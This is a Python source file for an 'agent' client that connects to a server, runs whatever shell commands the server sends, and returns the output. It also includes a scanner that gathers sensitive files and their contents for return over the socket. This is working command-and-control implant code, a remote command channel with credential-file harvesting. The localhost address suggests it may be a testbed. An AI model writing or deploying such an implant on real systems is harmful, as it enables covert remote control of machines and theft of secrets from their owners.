#!/usr/bin/env python3
import socket
import json
import time
from executor import CommandExecutor
from sensitive_scanner import SensitiveFileScanner

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 9001
RETRY_DELAY = 1.0  # seconds


class JsonSocket:
    """Line-delimited JSON over a socket using a file-like wrapper."""

    def __init__(self, sock: socket.socket):
        self._sock = sock
        self._fp = sock.makefile("rwb")

    def send(self, obj: dict) -> None:
        self._fp.write((json.dumps(obj) + "\n").encode("utf-8"))
        self._fp.flush()

    def recv(self) -> dict:
        line = self._fp.readline()
        if not line:
            raise ConnectionError("peer closed connection")
        return json.loads(line.decode("utf-8"))

    def close(self) -> None:
        try:
            self._fp.close()
        finally:
            self._sock.close()


class SimpleExecutor:
    """Enhanced executor with sensitive file scanning capabilities."""

    def run(self, command: str) -> dict:
        # Regular command execution
        executor = CommandExecutor()
        result = executor.run(command)
        if result.ok:
            return {"status": "OK", "output": result.stdout}
        else:
            return {"status": "Failed", "echo": command}
    
    def _handle_sensitive_scan(self, command: str) -> dict:
        """Handle sensitive file scanning commands."""
        parts = command.split()
        
        # Default parameters
        scan_path = "."
        copy_files = False
        
        # Parse command arguments
        if len(parts) > 1:
            scan_path = parts[1]
        if "--copy" in parts:
            copy_files = True
        
        try:
            scanner = SensitiveFileScanner(copy_files=copy_files)
            findings = scanner.scan(scan_path)
            
            # Format results
            result_data = {
                "scan_path": scan_path,
                "findings_count": len(findings),
                "findings": []
            }
            
            for finding in findings:
                finding_data = {
                    "path": finding.path,
                    "reason": finding.reason,
                    "detail": finding.detail
                }
                if finding.file_content:
                    finding_data["file_content"] = finding.file_content
                result_data["findings"].append(finding_data)
            
            return {"status": "OK", "output": f"Found {len(findings)} sensitive files", "data": result_data}
        
        except (OSError, ValueError) as e:
            return {"status": "Failed", "output": f"Scan failed: {str(e)}"}


class AgentClient:
    def __init__(self, host: str, port: int, retry_delay: float = 1.0):
        self.host = host
        self.port = port
        self.retry_delay = retry_delay
        self.executor = SimpleExecutor()

    def _connect_with_retry(self) -> JsonSocket:
        while True:
            try:
                sock = socket.create_connection(
                    (self.host, self.port), timeout=5)
                sock.settimeout(None)
                print("[agent] connected to server.")
                return JsonSocket(sock)
            except OSError:
                print("[agent] server unavailable, retrying ...")
                time.sleep(self.retry_delay)

    def run(self) -> None:
        jsock = self._connect_with_retry()
        try:
            # Loop: receive commands, respond with OK
            while True:
                try:
                    incoming = jsock.recv()
                except ConnectionError:
                    print("[agent] server disconnected.")
                    break

                if incoming.get("type") == "shell":
                    cmd = incoming.get("data", "")
                    if not cmd:
                        jsock.send({"type": "result", "status": "Failed", "output": "No command provided"})
                        continue
                    result = self.executor.run(cmd)
                    jsock.send(
                        {"type": "result", **result})
                # ignore unknown message types
        finally:
            jsock.close()


if __name__ == "__main__":
    AgentClient(SERVER_HOST, SERVER_PORT, RETRY_DELAY).run()
